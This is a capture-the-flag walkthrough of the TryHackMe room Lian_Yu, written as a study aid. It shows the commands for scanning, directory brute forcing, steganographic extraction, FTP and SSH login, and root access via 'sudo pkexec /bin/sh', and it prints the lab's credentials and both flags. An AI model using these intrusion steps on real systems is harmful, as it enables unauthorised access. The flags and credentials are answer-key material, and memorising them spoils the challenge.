# TryHackMe -- Lian_Yu Write-up (Full Walkthrough with Failed Attempts)

Author: Vinay Trivedi\
Platform: TryHackMe\
Room: Lian_Yu\
Difficulty: Easy

------------------------------------------------------------------------

# 1. Initial Reconnaissance

The first step was to scan the target machine using Nmap.

``` bash
nmap -sC -sV -A 10.112.156.79
```

### Result

    PORT    STATE SERVICE VERSION
    21/tcp  open  ftp     vsftpd 3.0.2
    22/tcp  open  ssh     OpenSSH 6.7p1 Debian
    80/tcp  open  http    Apache httpd
    111/tcp open  rpcbind

### Observations

-   FTP (21) -- possible credential entry
-   SSH (22) -- remote access
-   HTTP (80) -- main attack surface

------------------------------------------------------------------------

# 2. Web Enumeration

Opening the website:

    http://10.112.156.79

The page showed **Purgatory**.

Next step was directory brute forcing.

``` bash
gobuster dir -u http://10.112.156.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Result

    /island

------------------------------------------------------------------------

# 3. Investigating /island

Opening:

    http://10.112.156.79/island

Viewing page source:

    Ohhh Noo, Don't Talk.............
    I wasn't Expecting You at this Moment. I will meet you there <!-- go!go!go! -->
    You should find a way to Lian_Yu as we are planed.
    The Code Word is: vigilante

### Clues

-   Hidden comment
-   Code word **vigilante**

------------------------------------------------------------------------

# 4. Further Enumeration

``` bash
gobuster dir -u http://10.112.156.79/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Result:

    /2100

Opening:

    http://10.112.156.79/island/2100

Source revealed:

    <!-- you can avail your .ticket here but how? -->

------------------------------------------------------------------------

# 5. Finding the Ticket

``` bash
gobuster dir -u http://10.112.156.79/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x ticket
```

Result:

    /green_arrow.ticket

Opening the file:

    This is just a token to get into Queen's Gambit(Ship)

    RTy8yhBQdscX

------------------------------------------------------------------------

# 6. Decoding the Token

First attempt: Base64

``` bash
echo RTy8yhBQdscX | base64 -d
```

Result:

    Invalid / unreadable output

Second attempt: CyberChef detection

Result:

    Base58

Decoded value:

    !#th3h00d

------------------------------------------------------------------------

# 7. FTP Access

``` bash
ftp 10.112.156.79
```

Credentials:

    Username: vigilante
    Password: !#th3h00d

Login successful.

Files found:

    Leave_me_alone.png
    Queen's_Gambit.png
    aa.jpg

------------------------------------------------------------------------

# 8. Failed FTP Attempt

Tried downloading everything:

``` bash
get *
```

Result:

    550 Failed to open file

So files were downloaded individually.

------------------------------------------------------------------------

# 9. Steganography

Checked metadata:

``` bash
exiftool Leave_me_alone.png
```

Result:

    File format error

Checked another image:

``` bash
exiftool aa.jpg
```

Normal image.

Next step:

``` bash
stegseek aa.jpg
```

Result:

    Found passphrase: password
    Extracting ss.zip

------------------------------------------------------------------------

# 10. Extracting Hidden Files

``` bash
unzip aa.jpg.out
```

Files extracted:

    passwd.txt
    shado

Checking content:

    cat shado

Result:

    M3tahuman

------------------------------------------------------------------------

# 11. Failed SSH Attempts

First attempt:

``` bash
ssh vigilante@10.112.156.79
```

Password:

    M3tahuman

Result:

    Permission denied

Second attempt:

``` bash
ssh oliver@10.112.156.79
```

Result:

    Permission denied

Third attempt:

``` bash
ssh Oliver@10.112.156.79
```

Result:

    Permission denied

------------------------------------------------------------------------

# 12. User Discovery

Re-enumerating FTP revealed hidden file:

    .other_user

This contained multiple usernames.

Trying them revealed:

    slade

------------------------------------------------------------------------

# 13. SSH Access

``` bash
ssh slade@10.112.156.79
```

Password:

    M3tahuman

Login successful.

------------------------------------------------------------------------

# 14. User Flag

    cat user.txt

Result:

    THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

------------------------------------------------------------------------

# 15. Privilege Escalation

Checking sudo permissions:

``` bash
sudo -l
```

Result:

    (root) PASSWD: /usr/bin/pkexec

------------------------------------------------------------------------

# 16. Root Access

Using GTFOBins technique:

``` bash
sudo pkexec /bin/sh
```

Password:

    M3tahuman

Check:

``` bash
whoami
```

Result:

    root

------------------------------------------------------------------------

# 17. Root Flag

    cat /root/root.txt

Result:

    THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}

------------------------------------------------------------------------

# Flags

  ------------------------------------------------------------------------------------------------------------------------------
  Type                             Flag
  -------------------------------- ---------------------------------------------------------------------------------------------
  User                             THM{P30P7E_K33P_53CRET5\_\_C0MPUT3R5_D0N'T}

  Root                             THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
  ------------------------------------------------------------------------------------------------------------------------------

------------------------------------------------------------------------

# Skills Learned

-   Web directory enumeration
-   Hidden file discovery
-   Encoding analysis
-   FTP credential abuse
-   Steganography extraction
-   SSH authentication
-   Linux privilege escalation using GTFOBins

------------------------------------------------------------------------

# Conclusion

This challenge demonstrated a full attack chain:

1.  Web enumeration
2.  Hidden file discovery
3.  Token decoding
4.  FTP access
5.  Steganography
6.  Credential harvesting
7.  SSH login
8.  Privilege escalation

A good example of how multiple small clues combine to achieve full
system compromise.
